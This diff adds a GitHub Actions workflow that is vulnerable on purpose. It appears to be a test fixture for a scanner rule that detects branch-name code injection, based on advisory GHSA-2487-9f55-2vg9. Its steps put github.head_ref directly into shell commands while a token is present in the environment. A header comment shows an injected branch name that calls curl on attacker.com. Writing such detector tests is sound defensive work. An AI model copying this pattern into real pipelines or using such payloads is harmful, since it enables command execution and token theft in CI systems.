@@ -1,0 +1,38 @@
+# GHSA-2487-9f55-2vg9: Code injection via malicious branch names in OZI-Project/publish
+# Advisory URL: https://github.com/advisories/GHSA-2487-9f55-2vg9
+# Vulnerability Type: Code Injection (Moderate)
+# Expected Detection: CodeInjectionMediumRule
+#
+# Vulnerable Pattern: Untrusted github.head_ref (branch name) is used in PR creation logic
+# Attacker can create a branch with name like: feature/test$(curl attacker.com)
+
+name: Vulnerable OZI Publish Branch Name Injection
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Vulnerable: Branch name (github.head_ref) is directly interpolated
+      - name: Create release PR with branch name
+        run: |
+          BRANCH_NAME="${{ github.head_ref }}"
+          echo "Creating PR for branch: $BRANCH_NAME"
+          # Branch name is used in shell command without sanitization
+          gh pr create --title "Release from $BRANCH_NAME" --body "Automated release"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # Another vulnerable pattern
+      - name: Generate release notes
+        run: |
+          # Attacker can inject commands via branch name
+          echo "Release notes for ${{ github.head_ref }}" > notes.txt
+          cat notes.txt
